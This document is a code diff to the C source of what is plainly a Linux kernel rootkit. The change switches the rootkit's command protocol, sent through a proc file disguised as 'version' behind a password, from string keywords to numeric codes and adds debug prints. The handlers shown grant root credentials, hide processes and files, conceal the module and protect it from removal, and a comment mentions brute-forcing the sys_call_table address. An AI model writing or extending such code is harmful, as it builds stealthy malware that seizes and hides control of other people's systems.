@@ -56,15 +56,15 @@ struct proc_dir_entry
 */
 #define CFG_PROC_FILE "version"
 #define CFG_PASS "password"
-#define CFG_ROOT "root"
-#define CFG_HIDE_PID "hide_pid"
-#define CFG_UNHIDE_PID "unhide_pid"
-#define CFG_HIDE_FILE "hide_file"
-#define CFG_UNHIDE_FILE "unhide_file"
-#define CFG_HIDE "hide"
-#define CFG_UNHIDE "unhide"
-#define CFG_PROTECT "protect"
-#define CFG_UNPROTECT "unprotect"
+#define CFG_ROOT 1
+#define CFG_HIDE_PID 2
+#define CFG_UNHIDE_PID 3
+#define CFG_HIDE_FILE 4
+#define CFG_UNHIDE_FILE 5
+#define CFG_HIDE 6
+#define CFG_UNHIDE 7
+#define CFG_PROTECT 8
+#define CFG_UNPROTECT 9
 
 //For finding the sys_call_table adress we will brute force it
 //It has to be in this range depending OS type.
@@ -767,8 +767,11 @@ int execute_command(const char __user *str, size_t length)
     // is in the valid format
 
     str += sizeof(CFG_PASS);
+    int inputNumber = atoi(str);
+    printk("%d",inputNumber);
+    printk("%s", str + sizeof(char));
 
-    if (strcmp(str, CFG_ROOT) == 0)
+    if (inputNumber==CFG_ROOT)
     {
         pr_info("Got root command\n");
         struct cred *creds = prepare_creds();
@@ -778,46 +781,46 @@ int execute_command(const char __user *str, size_t length)
 
         commit_creds(creds);
     }
-    else if (strcmp(str, CFG_HIDE_PID) == 0)
+    else if (inputNumber==CFG_HIDE_PID)
     {
         pr_info("Got hide pid command\n");
-        str += sizeof(CFG_HIDE_PID);
+        str += sizeof(char);
         pid_add(str);
     }
-    else if (strcmp(str, CFG_UNHIDE_PID) == 0)
+    else if (inputNumber==CFG_UNHIDE_PID)
     {
         pr_info("Got unhide pid command\n");
-        str += sizeof(CFG_UNHIDE_PID);
+        str += sizeof(char);
         pid_remove(str);
     }
-    else if (strcmp(str, CFG_HIDE_FILE) == 0)
+    else if (inputNumber==CFG_HIDE_FILE)
     {
         pr_info("Got hide file command\n");
-        str += sizeof(CFG_HIDE_FILE);
+        str += sizeof(char);
         file_add(str);
     }
-    else if (strcmp(str, CFG_UNHIDE_FILE) == 0)
+    else if (inputNumber==CFG_UNHIDE_FILE)
     {
         pr_info("Got unhide file command\n");
-        str += sizeof(CFG_UNHIDE_FILE);
+        str += sizeof(char);
         file_remove(str);
     }
-    else if (strcmp(str, CFG_HIDE) == 0)
+    else if (inputNumber==CFG_HIDE)
     {
         pr_info("Got hide command\n");
         hide();
     }
-    else if (strcmp(str, CFG_UNHIDE) == 0)
+    else if (inputNumber==CFG_UNHIDE)
     {
         pr_info("Got unhide command\n");
         unhide();
     }
-    else if (strcmp(str, CFG_PROTECT) == 0)
+    else if (inputNumber==CFG_PROTECT)
     {
         pr_info("Got protect command\n");
         protect();
     }
-    else if (strcmp(str, CFG_UNPROTECT) == 0)
+    else if (inputNumber==CFG_UNPROTECT)
     {
         pr_info("Got unprotect command\n");
         unprotect();
